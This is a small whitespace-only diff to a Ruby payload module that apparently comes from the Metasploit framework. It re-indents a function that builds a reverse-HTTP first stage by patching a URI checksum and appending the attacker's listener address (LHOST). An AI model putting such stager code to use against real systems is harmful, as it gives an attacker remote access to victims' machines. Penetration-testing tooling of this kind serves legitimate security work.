@@ -66,16 +66,16 @@ module Metasploit3
     false
   end
 
-	#
-	# Generate the first stage
-	#
-	def payload
-		p = super
-		i = p.index("/12345\x00")
-		u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW) + "\x00"
-		p[i, u.length] = u
-		p + datastore['LHOST'].to_s + "\x00"
-	end
+  #
+  # Generate the first stage
+  #
+  def payload
+    p = super
+    i = p.index("/12345\x00")
+    u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW) + "\x00"
+    p[i, u.length] = u
+    p + datastore['LHOST'].to_s + "\x00"
+  end
 
   #
   # Always wait at least 20 seconds for this payload (due to staging delays)
